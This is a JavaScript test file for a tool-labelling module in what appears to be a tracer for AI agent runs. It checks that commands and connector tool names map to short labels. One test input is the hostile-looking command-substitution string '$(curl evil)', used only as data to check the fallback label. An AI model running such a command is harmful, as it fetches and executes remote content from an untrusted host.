import { test } from 'node:test';
import assert from 'node:assert/strict';
import { toolOf } from '../dist/src/tool-label.js';
import { addStep, startTrace } from '../dist/src/run-trace.js';

const use = (name, input = {}) => ({ type: 'tool_use', name, input });

test('a step names its tool shortly, connectors by the source a person knows', () => {
  assert.equal(toolOf(use('Read', { file_path: '/x/a.ts' })), 'read');
  assert.equal(toolOf(use('Grep')), 'grep');
  assert.equal(toolOf(use('Bash', { command: 'git diff origin/develop...HEAD' })), 'git');
  assert.equal(toolOf(use('Bash', { command: '/usr/bin/npm test' })), 'npm');
  assert.equal(toolOf(use('Bash', { command: '$(curl evil)' })), 'bash');
  assert.equal(toolOf(use('mcp__claude_ai_Atlassian_MCP__searchJiraIssuesUsingJql')), 'jira.searchJiraIssuesUsingJql');
  assert.equal(toolOf(use('mcp__claude_ai_Notion__notion-search')), 'notion.search');
  assert.equal(toolOf(use('mcp__claude_ai_Slack__slack_read_thread')), 'slack.read_thread');
  assert.equal(toolOf(use('mcp__claude_ai_Gitlab__get_merge_request')), 'gitlab.get_merge_request');
  assert.equal(toolOf(use('Agent')), 'agent');
  assert.equal(toolOf({ type: 'text', text: 'hi' }), null);
});

test('a step keeps its tool in the trace, and one without stays as before', () => {
  let t = startTrace({ id: 'r', slug: 'p/x', project: 'p', iid: 1, kind: 'review', command: 'c', at: '2026-11-05T10:00:00Z' });
  t = addStep(t, 'Reading a.ts', '2026-11-05T10:00:01Z', { tool: 'read' });
  t = addStep(t, 'Thinking', '2026-11-05T10:00:02Z');
  assert.equal(t.steps[0].tool, 'read');
  assert.ok(!('tool' in t.steps[1]));
});
